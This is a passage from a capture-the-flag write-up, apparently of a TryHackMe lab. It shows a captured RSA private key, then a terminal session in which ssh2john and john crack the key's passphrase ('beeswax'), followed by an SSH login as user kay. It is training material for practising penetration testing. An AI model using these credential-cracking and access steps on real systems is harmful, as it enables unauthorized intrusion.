I/zN/2KspUeW/5mqWwvFiK8QU38m7M+mli5ZX76snfJE9suva3ehHP2AeN5hWDMw
X+CuDSIXPo10RDX+OmmoExMQn5xc3LVtZ1RKNqono7fA21CzuCmXI2j/LtmYwZEL
OScgwNTLqpB6SfLDj5cFA5cdZLaXL1t7XDRzWggSnCt+6CxszEndyUOlri9EZ8XX
oHhZ45rgACPHcdWcrKCBfOQS01hJq9nSJe2W403lJmsx/U3YLauUaVgrHkFoejnx
CNpUtuhHcVQssR9cUi5it5toZ+iiDfLoyb+f82Y0wN5Tb6PTd/onVDtskIlfE731
DwOy3Zfl0l1FL6ag0iVwTrPBl1GGQoXf4wMbwv9bDF0Zp/6uatViV1dHeqPD8Otj
Vxfx9bkDezp2Ql2yohUeKBDu+7dYU9k5Ng0SQAk7JJeokD7/m5i8cFwq/g5VQa8r
sGsOxQ5Mr3mKf1n/w6PnBWXYh7n2lL36ZNFacO1V6szMaa8/489apbbjpxhutQNu
Eu/lP8xQlxmmpvPsDACMtqA1IpoVl9m+a+sTRE2EyT8hZIRMiuaaoTZIV4CHuY6Q
3QP52kfZzjBt3ciN2AmYv205ENIJvrsacPi3PZRNlJsbGxmxOkVXdvPC5mR/pnIv
wrrVsgJQJoTpFRShHjQ3qSoJ/r/8/D1VCVtD4UsFZ+j1y9kXKLaT/oK491zK8nwG
URUvqvBhDS7cq8C5rFGJUYD79guGh3He5Y7bl+mdXKNZLMlzOnauC5bKV4i+Yuj7
AGIExXRIJXlwF4G0bsl5vbydM55XlnBRyof62ucYS9ecrAr4NGMggcXfYYncxMyK
AXDKwSwwwf/yHEwX8ggTESv5Ad+BxdeMoiAk8c1Yy1tzwdaMZSnOSyHXuVlB4Jn5
phQL3R8OrZETsuXxfDVKrPeaOKEE1vhEVZQXVSOHGCuiDYkCA6al6WYdI9i2+uNR
ogjvVVBVVZIBH+w5YJhYtrInQ7DMqAyX1YB2pmC+leRgF3yrP9a2kLAaDk9dBQcV
ev6cTcfzhBhyVqml1WqwDUZtROTwfl80jo8QDlq+HE0bvCB/o2FxQKYEtgfH4/UC
D5qrsHAK15DnhH4IXrIkPlA799CXrhWi7mF5Ji41F3O7iAEjwKh6Q/YjgPvgj8LG
OsCP/iugxt7u+91J7qov/RBTrO7GeyX5Lc/SW1j6T6sjKEga8m9fS10h4TErePkT
t/CCVLBkM22Ewao8glguHN5VtaNH0mTLnpjfNLVJCDHl0hKzi3zZmdrxhql+/WJQ
4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
-----END RSA PRIVATE KEY-----
```
From here we have the private ssh key. We transfer this to our box and run ssh2john followed by john to get our password. We then just simply ssh as the user
and use the password that we cracked.

```bash

kali@kali:~/tryhackme$ nano id_rs
kali@kali:~/tryhackme$ chmod 400 id_rs
kali@kali:~/tryhackme$ ssh kay@10.10.61.236
kay@10.10.61.236's password:

[3]+  Stopped                 ssh kay@10.10.61.236 <--- this shows us that the key needs a password

kali@kali:~/tryhackme$ sudo /home/kali/ssh2john.py id_rs > hash.hash
sudo: /home/kali/ssh2john.py: command not found
kali@kali:~/tryhackme$ sudo python /usr/share/john/ssh2john.py id_rs > hash
kali@kali:~/tryhackme$ cat hash
id_rs:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712ef86e499d5cad1af838d19402729c471837fbdbe7eb172e8e9cd40ee52d959a3d772204241e305194ee7813ec99be3ced17455644ce550ad51edcb52b668bcb62e46b60a77e3cfc2e5bfe14c69db0d5d1be3c3f1d18867173d8f01ee7b00d5e88f62b3d91c81f740e14862548f318bfbf510bae62e9fae40d2bf15f36dd7d702400dfb74f9154e3d00454a049b599cb4c4070df59b18efd252d702a21a5f941f79731a70840e51608701396955798d946e01686edc557b350263e279f971eee37846e07d3594b8669d25a656c26f85046b05f44edf9529dea4ce1f8193469485640909d9dbfd4f9d45ab2ede8c6aca494a53674fb1e53bae5bcf02a6bacbea202bfc284db9d3ae446780aa8b431325948599c9ee32acb1137dcdbbe61cd555887a1642e0b4e7da972d1b32a188accf9e595a173ab64f065bfc8b23530dd0c4de3463a9b38694fb34d6101628847150f684af5f25719f8e958d34570da834bdb129482d4295768f01f4e3219d5db7c92d85a55f19c926954c84a0ba6bbe697b8655c5f98cb7441c2b8a0a3b569118ca8b14dc1a3f125857a1dab94a1513137b6d4a68f9e2d856ce66a39b5ba560e18b43517e718fd6de9b9fb4ef6fbec009ac86cc774ba4802a666bffd21c114e7adb455858d4251fef118d99b9b3607ccd130329a44da2f261526951422440b7703827e53bd05177e1e82249455ae177157256a563b28b7e0b317b99b5a6e6716c4cf3e53a79dd0ba266ad41148de21b2f305c5ba6d7e6cf9bf7978579c79632655e0745a1aa73ed0ed56d837b05763c69d218065ea2b86c03019cce1c84570aed1a6f0918ec2b25985440c9318bdcf3b674cacbcea559fd5a714e51d38df94e2960fe8f98d53865dd907a434859811764864ccb2a6e18215d03448045febf90ac06a073800822b78a101028a6cef927e581705a1d76fa934a1c31001620ec5826e9cf28df1bcf39502c9b3526b65789b86555a3de57b5f6e4d694caee6ee1b82d1616ff7fc68129b7a5e1795647ee07c5ba2da49c7a45507210f67f91588eab74b51a9c074916689f7db4c40e2138f91c1bae890f21e54ba077dbcb95888e836ba7eb6223a70384c48c94cf3b946971210a40a220eb980809ba5c5a3d54e08f6610765e1dcd2bda5cae7d96e77d852bd2a095a3cfa64bc5fbe6c79ea0dcfc6ae40be03238217213ab9b1a0873f8cbf9ed9b3d40dd0d0536365702a7452bf85301d84c4397621979cdc37b5b983f301af78655f352684c57799037f633a09b755ba0de9c017a73d76e0a8f46c4c33c4207358a8b408f1c52d8b8ca0378ba8ffcd224a125e5a0973c6997a6225e51007e600c22d3e24ebbc1e8bd8ff250eb32d44f4bd298ba27a3522215db0c3b89d49f2277cfedd74c3b59a1497936263826308f2e14cd363025aa7a5c39aa9a77b815dd10ff6ac9a5d8bda4074513f0fad3b6df926da5ca3c51f47479a8c271a60dab493fe78cadce92f3debe1c05ef72f3f194a36d23bfa3b0d4f0b8f04236d485be8d7d97dfb1c5de79613568d58f113308e8a73c7b87ca11b7b53e63d37f055b5bb7e5f39982e7bbedea3aae16daa3b29ccd8f9d98d53e97a1fbc0c1a2e701e5b7d7b224a4371358b02103e25b29c54138b8c4b7c9706967fe384b263c284ceb0336887e7da79e3c10d54d85689c0db4c379388b2138d0c40017fd2256aae3a2d21a93116a134d5f0ce8ce1fbf2c61509868c823fccdff62aca54796ff99aa5b0bc588af10537f26eccfa6962e595fbeac9df244f6cbaf6b77a11cfd8078de615833305fe0ae0d22173e8d744435fe3a69a81313109f9c5cdcb56d67544a36aa27a3b7c0db50b3b829972368ff2ed998c1910b392720c0d4cbaa907a49f2c38f970503971d64b6972f5b7b5c34735a08129c2b7ee82c6ccc49ddc943a5ae2f4467c5d7a07859e39ae00023c771d59caca0817ce412d35849abd9d225ed96e34de5266b31fd4dd82dab9469582b1e41687a39f108da54b6e84771542cb11f5c522e62b79b6867e8a20df2e8c9bf9ff36634c0de536fa3d377fa27543b6c90895f13bdf50f03b2dd97e5d25d452fa6a0d225704eb3c19751864285dfe3031bc2ff5b0c5d19a7feae6ad5625757477aa3c3f0eb635717f1f5b9037b3a76425db2a2151e2810eefbb75853d939360d1240093b2497a8903eff9b98bc705c2afe0e5541af2bb06b0ec50e4caf798a7f59ffc3a3e70565d887b9f694bdfa64d15a70ed55eacccc69af3fe3cf5aa5b6e3a7186eb5036e12efe53fcc509719a6a6f3ec0c008cb6a035229a1597d9be6beb13444d84c93f2164844c8ae69aa13648578087b98e90dd03f9da47d9ce306dddc88dd80998bf6d3910d209bebb1a70f8b73d944d949b1b1b19b13a455776f3c2e6647fa6722fc2bad5b202502684e91514a11e3437a92a09febffcfc3d55095b43e14b0567e8f5cbd91728b693fe82b8f75ccaf27c0651152faaf0610d2edcabc0b9ac51895180fbf60b868771dee58edb97e99d5ca3592cc9733a76ae0b96ca5788be62e8fb006204c574482579701781b46ec979bdbc9d339e57967051ca87fadae7184bd79cac0af834632081c5df6189dcc4cc8a0170cac12c30c1fff21c4c17f20813112bf901df81c5d78ca22024f1cd58cb5b73c1d68c6529ce4b21d7b95941e099f9a6140bdd1f0ead9113b2e5f17c354aacf79a38a104d6f844559417552387182ba20d890203a6a5e9661d23d8b6fae351a208ef5550555592011fec39609858b6b22743b0cca80c97d58076a660be95e460177cab3fd6b690b01a0e4f5d0507157afe9c4dc7f384187256a9a5d56ab00d466d44e4f07e5f348e8f100e5abe1c4d1bbc207fa3617140a604b607c7e3f5020f9aabb0700ad790e7847e085eb2243e503bf7d097ae15a2ee6179262e351773bb880123c0a87a43f62380fbe08fc2c63ac08ffe2ba0c6deeefbdd49eeaa2ffd1053aceec67b25f92dcfd25b58fa4fab2328481af26f5f4b5d21e1312b78f913b7f08254b064336d84c1aa3c82582e1cde55b5a347d264cb9e98df34b5490831e5d212b38b7cd999daf186a97efd6250e1e6820079358542f77ac78ddd9a505919c318000fc47f8b80fc84f12cf58adf1a3ee3fc8190015058c16c414cc0d6017b9a1fb032ee20e842573b30fc3214ac5fb8962437477e81bb6479fa498f148924796d6d616218ec2a5fa0949def8542dc9b75fd95b75c26fbe91ef9b06e61e90e0df20bb973f33471dab5e87f4c1f0a5d8a7f4e653a8edb337116fa6e5ed858
kali@kali:~/tryhackme$ sudo john -w=/home/kali/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rs)
^Z
[4]+  Stopped                 sudo john -w=/home/kali/rockyou.txt hash
kali@kali:~/tryhackme$ ssh kay@10.10.61.236
kay@10.10.61.236's password:
Permission denied, please try again.
kay@10.10.61.236's password:

[5]+  Stopped                 ssh kay@10.10.61.236
kali@kali:~/tryhackme$ ssh -i id_rs kay@10.10.61.236
load pubkey "id_rs": invalid format
Enter passphrase for key 'id_rs':
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


kay@basic2:~$
```
And here we managed to get into the system as the user.


Thanks for reading hope that you enjoyed.
